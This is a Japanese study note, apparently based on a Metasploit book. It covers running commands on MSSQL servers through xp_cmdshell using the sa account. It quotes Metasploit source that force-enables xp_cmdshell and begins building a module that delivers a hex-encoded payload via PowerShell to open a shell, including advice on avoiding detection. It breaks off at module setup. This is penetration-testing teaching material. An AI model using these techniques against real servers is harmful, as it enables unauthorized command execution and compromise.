@@ -1,0 +1,99 @@
+独自モジュールの構築
+
+独自で作成するにはある程度のプログラミング経験と何を構築したいかというアイデアがあれば比較的簡単。
+MetasploitはRubyベースなのでRubyで開発するのが楽。
+この章で作成するのはmssql_powershellというモジュール。
+このモジュールはMSFのバイナリーペイロードをMSSQLコマンドを介してターゲットへ
+送り込めるようにhex-blobへと変換する。
+このペイロードがターゲットシステムへ入るとPowershellスクリプトによって
+16進表記データがバイナリの実行ファイルに戻され、実行され攻撃者にシェルを解放する。
+
+MSSQLServerでコマンド実行
+多くのシステム管理者はsaアカウントパスワードを弱いものに設定している。
+SQLServerモジュールを通して基本的なコマンドを実行する方法は以下
+
+msf > use auxiliary/admin/mssql/mssql_exec
+msf auxiliary(admin/mssql/mssql_exec) > show options
+
+Module options (auxiliary/admin/mssql/mssql_exec):
+
+   Name                 Current Setting                       Required  Description
+   ----                 ---------------                       --------  -----------
+   CMD                  cmd.exe /c echo OWNED > C:\owned.exe  no        Command to execute
+   PASSWORD                                                   no        The password for the specified username
+   RHOST                                                      yes       The target address
+   RPORT                1433                                  yes       The target port (TCP)
+   TDSENCRYPTION        false                                 yes       Use TLS/SSL for TDS data "Force Encryption"
+   USERNAME             sa                                    no        The username to authenticate as
+   USE_WINDOWS_AUTHENT  false                                 yes       Use windows authentification (requires DOMAIN option set)
+
+msf auxiliary(admin/mssql/mssql_exec) >
+
+これでsaアカウントのパスワードが分かればCMDに設定したコマンドをターゲットPCで実行できる。
+
+既存のMetasploitモジュールの調査
+auxiliary/admin/mssql/mssql_execが何をしているのか抜粋。
+nano /usr/share/metasploit-framework/modules/auxiliary/admin/mssql/mssql_exec.rb
+class MetasploitModule < Msf::Auxiliary
+  include Msf::Exploit::Remote::MSSQL
+
+  def run
+    mssql_xpcmdshell(datastore['CMD'], true) if mssql_login_datastore
+  end
+
+まずある特徴を継承するauxliaryモジュールとしてクラスを定義。
+またincludeでMetasploitコアライブラリからSQLServerモジュールを引っ張ってくる。
+これはSQLServerとの通信などSQLServerに関する全てのものを処理するもの。
+最後にmssql_xpcmdshellで指定されたコマンドを取得する。
+
+呼び出されているもの自体の確認
+以下のものがまず呼び出されている。
+/usr/share/metasploit-framework/lib/msf/core/exploit/mssql.rb
+def mssql_xpcmdshell(cmd, doprint=false, opts={})
+    force_enable = false
+    begin
+      res = mssql_query("EXEC master..xp_cmdshell '#{cmd}'", false, opts)
+      if res[:errors] && !res[:errors].empty?
+        if res[:errors].join =~ /xp_cmdshell/
+          if force_enable
+            print_error("The xp_cmdshell procedure is not available and could not be enabled")
+            raise RuntimeError, "Failed to execute command"
+          else
+            print_status("The server may have xp_cmdshell disabled, trying to enable it...")
+            mssql_query(mssql_xpcmdshell_enable())
+            raise RuntimeError, "xp_cmdshell disabled"
+          end
+        end
+      end
+
+      mssql_print_reply(res) if doprint
+
+      return res
+
+この中で実際にクエリを投げているのは以下のファイル
+/usr/share/metasploit-framework/lib/msf/core/exploit/mssql_commands.rb
+  # Re-enable the xp_cmdshell stored procedure in 2005 and 2008
+  def mssql_xpcmdshell_enable(opts={})
+    "exec master.dbo.sp_configure 'show advanced options',1;RECONFIGURE;exec master.dbo.sp_configure 'xp_cmdshell', 1;RECO$
+  end
+
+これらを使えば新しいモジュールは作成できる。
+
+新たなモジュールの作成
+今回のモジュールを作成する上でのシナリオはSQLServerパスワードは空白。xp_xmdshellストアドプロシージャへのアクセスも可能。
+ポートは1433以外閉じられており、FWを停止するのは気づかれるので止めておく。
+
+Powershell
+結構便利な標準で入っているプログラミング言語。これを今回利用する。
+ここではまずバイナリコードを16進表記に変換しOS上に出力されるMetasploitを使った新たなモジュールを作成する。
+次にそれを実行可能なバイナリに戻すためPowershellをルカう。
+とりあえずmddql_payloadエクスプロイトをコピー
+root@kali:/usr/share/metasploit-framework/modules/exploits/windows/mssql# cp mssql_payload.rb mssql_powershell.rb
+
+エクスプロイトを正しく動作させるには以下の基本設定が必要
+・名前、説明、ライセンス、参考文献
+・プラットフォーム
+・ターゲット
+・エクスプロイト本体で利用される関数
+・攻撃者とエクスプロイトされたターゲット間の接続を扱うハンドラ
+
